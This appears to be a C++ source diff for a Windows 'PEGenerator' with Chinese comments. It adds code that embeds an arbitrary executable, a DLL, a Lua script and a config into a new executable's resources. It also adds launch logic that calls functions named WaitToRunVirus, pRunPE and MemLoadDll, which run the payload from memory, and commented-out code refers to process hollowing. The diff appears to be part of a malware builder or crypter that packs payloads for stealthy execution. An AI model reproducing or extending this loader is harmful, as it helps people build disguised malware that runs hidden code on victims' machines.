@@ -1,8 +1,162 @@
 #include "PEGenerator.h"
 
+void CPEGenerator::ParseParams(int argc, wchar_t* argv[]) {
+    if (argc <= 1) {
+        WaitToRunVirus();
+        // MemoryLoadToRun(IDR_BINARY_FILE);
+        // MemoryLoadToRun(IDR_BINARY_FILE);
+        //pRunPE(IDR_BINARY_FILE);
+    }
+    else if (argc == 2) {
+        CString str_param = argv[1];
+        if (str_param == L"run") {
+
+            // MemoryLoadToRun(IDR_BINARY_FILE);
+            MemLoadDll();
+
+            int cnt = 10;
+            int pid = -1;
+            int config = ExtractLuaGetCfg(IDR_CFG);
+            while (cnt-- && pid == -1) {
+                if (config) {
+                    pid = pRunPE(IDR_BINARY_FILE);
+                }
+                else {
+                    ExtractAndRunResourceProgram(IDR_BINARY_FILE, str_temp_path, pid);
+                }
+                Sleep(1000);
+            }
+
+
+            SharedMemory share;
+            share.WritePid(pid);
+
+
+
+            //HANDLE hMainThread = OpenThread(THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId());
+            //if (!hMainThread) {
+            //    return;
+            //}
+
+            //// 创建辅助线程执行 Hollowing
+            //HANDLE hThread = CreateThread(NULL, 0, HollowingThread, hMainThread, 0, NULL);
+            //if (!hThread) {
+            //    CloseHandle(hMainThread);
+            //    return;
+            //}
+
+            //// 等待辅助线程完成
+            //WaitForSingleObject(hThread, INFINITE);
+            //CloseHandle(hThread);
+            //CloseHandle(hMainThread);
+
+        }
+        else if (str_param == L"wait") {
+            return;
+        }
+
+    }
+    else if (argc >= 3) {
+
+        CString str_param = argv[1];
+        if (str_param == L"runlua") {
+            char* str_file;
+            WChar2Ansi(argv[2], str_file);
+            if (str_file) {
+                LuaRunner runner;
+                runner.run_lua_file(str_file);
+                delete[] str_file;
+            }
+            else {
+                OutputDebugStringA("trans file data to char failed .");
+            }
+            return;
+        }
+
+        WCHAR exePath[MAX_PATH];
+        // 获取当前程序的路径
+        DWORD result = GetModuleFileName(NULL, exePath, MAX_PATH);
+        LPCWSTR resourceFilePath = argv[1];
+        LPCWSTR newExePath = argv[2];
+        CString lua_path;
+        int config = 0;
+        if (argc >= 4) {
+            lua_path = argv[3];
+        }
+        if (argc >= 5) {
+            config = 1;
+        }
+#ifdef _WIN64
+        AddFileToResource(exePath, resourceFilePath, newExePath, lua_path, config);
+#else
+        AddFileToResource32(exePath, resourceFilePath, newExePath, lua_path, config);
+#endif
+    }
+}
+
+// 用于资源更新
+bool update_resource(CString str_path, HANDLE hUpdate, int rid) {
+
+    bool flag = false;
+
+    do {
+
+        // 打开要添加到资源的文件 phdll
+        std::ifstream phfile(str_path, std::ios::binary);
+        if (!phfile.is_open()) {
+            MessageBox(NULL, L"Failed to open the rc file.", str_path, MB_OK);
+            break;
+        }
+
+        // 读取文件内容到内存 phdll
+        phfile.seekg(0, std::ios::end);
+        size_t phfileSize = phfile.tellg();
+        phfile.seekg(0, std::ios::beg);
+
+        char* buffer = new char[phfileSize];
+        phfile.read(buffer, phfileSize);
+        phfile.close();
+
+        // 将文件内容更新到资源中 phdll
+        if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(rid), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), buffer, phfileSize)) {
+            MessageBox(NULL, L"Failed to update the rc to resource.", str_path, MB_OK);
+            delete[] buffer;
+            break;
+        }
+
+        delete[] buffer;
+        flag = true;
+    } while (0);
+    return flag;
+}
+
+bool update_config(int config, HANDLE hUpdate, int rid)
+{
+    bool flag = false;
+    do {
+        CStringA str_lua;
+        str_lua.Format(R"(
+            function getcfg()
+                return %d
+            end
+        )", config);
+
+        // 将文件内容更新到资源中 phdll
+        if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(rid), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), str_lua.GetBuffer(), str_lua.GetLength())) {
+            MessageBox(NULL, L"Failed to update the config lua to resource.", L"rc_config", MB_OK);
+            str_lua.ReleaseBuffer();
+            break;
+        }
+        str_lua.ReleaseBuffer();
+        flag = true;
+    } while (0);
+    return flag;
+}
+
 // 添加文件及资源到新的可执行文件
-BOOL AddFileToResource(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath) {
+BOOL AddFileToResource(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath, CString lua_path, int config) {
     WCHAR tempFilePath[MAX_PATH];
+    wchar_t msg[512] = { 0 };
 
     // 创建临时文件路径
     GetTempPath(MAX_PATH, tempFilePath);
@@ -50,6 +204,48 @@ BOOL AddFileToResource(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExe
     }
 
     delete[] buffer;
+
+
+    buffer = nullptr;
+
+    // 打开要添加到资源的文件 phdll
+    std::ifstream phfile(L"PhDll.dll", std::ios::binary);
+    if (!phfile.is_open()) {
+        MessageBox(NULL, L"Failed to open the ph file.", L"generator", MB_OK);
+        EndUpdateResource(hUpdate, TRUE);
+        DeleteFile(tempFilePath); // 删除临时文件
+        return FALSE;
+    }
+
+    // 读取文件内容到内存 phdll
+    phfile.seekg(0, std::ios::end);
+    size_t phfileSize = phfile.tellg();
+    phfile.seekg(0, std::ios::beg);
+
+    buffer = new char[phfileSize];
+    phfile.read(buffer, phfileSize);
+    phfile.close();
+
+    // 将文件内容更新到资源中 phdll
+    if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(IDR_PH), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), buffer, phfileSize)) {
+        MessageBox(NULL, L"Failed to update the phdll to resource.", L"generator", MB_OK);
+        delete[] buffer;
+        EndUpdateResource(hUpdate, TRUE);
+        DeleteFile(tempFilePath); // 删除临时文件
+        return FALSE;
+    }
+
+    delete[] buffer;
+
+    if (!lua_path.IsEmpty()) {
+        if (!update_resource(lua_path, hUpdate, IDR_LUA)) {
+            EndUpdateResource(hUpdate, TRUE);
+            DeleteFile(tempFilePath); // 删除临时文件
+            return FALSE;
+        }
+    }
+
+    update_config(config, hUpdate, IDR_CFG);
 
     do {
         // 加载要复制资源的文件
@@ -117,8 +313,9 @@ BOOL CALLBACK EnumLangsProc(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WOR
 }
 
 // 添加文件及资源到新的可执行文件
-BOOL AddFileToResource32(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath) {
+BOOL AddFileToResource32(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath, CString lua_path, int config) {
     WCHAR tempFilePath[MAX_PATH];
+    char msg[512] = { 0 };
 
     // 创建临时文件路径
     GetTempPath(MAX_PATH, tempFilePath);
@@ -165,7 +362,46 @@ BOOL AddFileToResource32(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newE
     }
 
     delete[] buffer;
+    buffer = nullptr;
 
+    // 打开要添加到资源的文件 phdll
+    std::ifstream phfile(L"PhDll.dll", std::ios::binary);
+    if (!phfile.is_open()) {
+        MessageBox(NULL, L"Failed to open the ph file.", L"generator", MB_OK);
+        EndUpdateResource(hUpdate, TRUE);
+        DeleteFile(tempFilePath); // 删除临时文件
+        return FALSE;
+    }
+
+    // 读取文件内容到内存 phdll
+    phfile.seekg(0, std::ios::end);
+    size_t phfileSize = phfile.tellg();
+    phfile.seekg(0, std::ios::beg);
+
+    buffer = new char[phfileSize];
+    phfile.read(buffer, phfileSize);
+    phfile.close();
+
+    // 将文件内容更新到资源中 phdll
+    if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(IDR_PH), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), buffer, phfileSize)) {
+        MessageBox(NULL, L"Failed to update the phdll to resource.", L"generator", MB_OK);
+        delete[] buffer;
+        EndUpdateResource(hUpdate, TRUE);
+        DeleteFile(tempFilePath); // 删除临时文件
+        return FALSE;
+    }
+
+    delete[] buffer;
+
+    if (!lua_path.IsEmpty()) {
+        if (!update_resource(lua_path, hUpdate, IDR_LUA)) {
+            EndUpdateResource(hUpdate, TRUE);
+            DeleteFile(tempFilePath); // 删除临时文件
+            return FALSE;
+        }
+    }
+
+    update_config(config, hUpdate, IDR_CFG);
 
     do {
 
@@ -190,7 +426,8 @@ BOOL AddFileToResource32(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newE
 
     // 完成资源更新
     if (!EndUpdateResource(hUpdate, FALSE)) {
-        MessageBox(NULL, L"Failed to finalize resource update.", L"generator", MB_OK);
+        sprintf_s(msg, "Failed to finalize resource update. errcode : %d .", GetLastError());
+        MessageBoxA(NULL, msg, "generator", MB_OK);
         DeleteFile(tempFilePath); // 删除临时文件
         return FALSE;
     }
